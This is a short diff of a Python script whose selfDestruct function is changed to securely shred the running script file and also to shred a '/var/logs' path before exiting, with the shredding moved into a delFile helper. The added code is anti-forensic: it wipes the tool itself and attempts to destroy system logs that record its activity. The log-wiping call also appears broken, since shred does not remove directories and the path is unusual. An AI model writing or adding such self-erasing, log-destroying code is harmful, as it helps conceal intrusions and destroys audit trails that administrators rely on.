@@ -1,9 +1,13 @@
 import subprocess
 
+def delFile(file):
+    process = subprocess.Popen(["shred", "-u", file])
+    process.wait()
+
 def selfDestruct():
     from sys import argv
-    process = subprocess.Popen(["shred", "-u", argv[0]])
-    process.wait()
+    delFile(argv[0])
+    delFile("/var/logs")
     quit()
     
 def statCheck(fname, i):
@@ -16,10 +20,6 @@ def statCheck(fname, i):
         f.write("\nNew STAT\n")
     f.write(str(res))
     f.close()
-    
-def delFile(file):
-    process = subprocess.Popen(["shred", "-u", file])
-    process.wait()
     
 def changer(fname):
     i = 0
